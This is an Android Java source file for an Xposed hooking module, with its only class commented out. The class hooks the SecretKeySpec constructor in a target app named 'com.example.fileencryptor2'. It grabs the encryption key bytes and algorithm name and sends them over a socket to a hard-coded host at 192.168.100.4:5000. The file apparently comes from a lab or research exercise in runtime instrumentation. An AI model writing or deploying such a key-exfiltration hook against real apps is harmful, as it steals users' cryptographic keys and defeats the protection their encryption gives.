package com.example.encryptorhook;

import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.Key;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

import static android.text.TextUtils.isEmpty;
import static de.robv.android.xposed.XposedHelpers.findAndHookConstructor;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

/*

public class HookKey implements IXposedHookLoadPackage {

    private Socket socket;
    private static final String SERVER_IP = "192.168.100.4";
    private static final int SERVERPORT = 5000;

    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        XposedBridge.log("Loaded app: " + lpparam.packageName);

        if (!lpparam.packageName.equals("com.example.fileencryptor2"))
                return;
        XposedBridge.log("App detected again!");


        findAndHookConstructor("javax.crypto.spec.SecretKeySpec", lpparam.classLoader, byte[].class, String.class,  new XC_MethodHook() {

                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    // this will be called after the clock was updated by the original method
                    XposedBridge.log("Inside SecretKeySpec class");
                    XposedBridge.log("Now retrieve byte key");

                    byte[] key = (byte[]) param.args[0];
                    String keymode = (String) param.args[1];
                    String skey = Base64.getEncoder().encodeToString(key);
                    XposedBridge.log(keymode);
                    if (isEmpty(keymode)) {
                        XposedBridge.log("False key");
                    } else {
                        XposedBridge.log("Creating socket 2");
                        new Thread(new ClientThread(skey, keymode)).start();
                        XposedBridge.log("Finished socket 2");
                    }


                }
            });


        }

    class ClientThread implements Runnable {


        private final String key;
        private final String keymode;

        ClientThread(String k, String km) {
            this.key = k;
            this.keymode = km;
        }

        @Override
        public void run() {

            try {
                InetAddress serverAddr = InetAddress.getByName(SERVER_IP);
                socket = new Socket(serverAddr, SERVERPORT);
                XposedBridge.log("Socket 2 made");
                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                bw.write(key);
                bw.newLine();
                bw.write(keymode);
                XposedBridge.log("key is " + key);
                XposedBridge.log("key mode is " + keymode);
                bw.flush();
                socket.close();
                XposedBridge.log("Socket 2 closed");

            } catch (UnknownHostException e1) {
                e1.printStackTrace();
            } catch (IOException e1) {
                e1.printStackTrace();
            }

        }

    }

    }


 */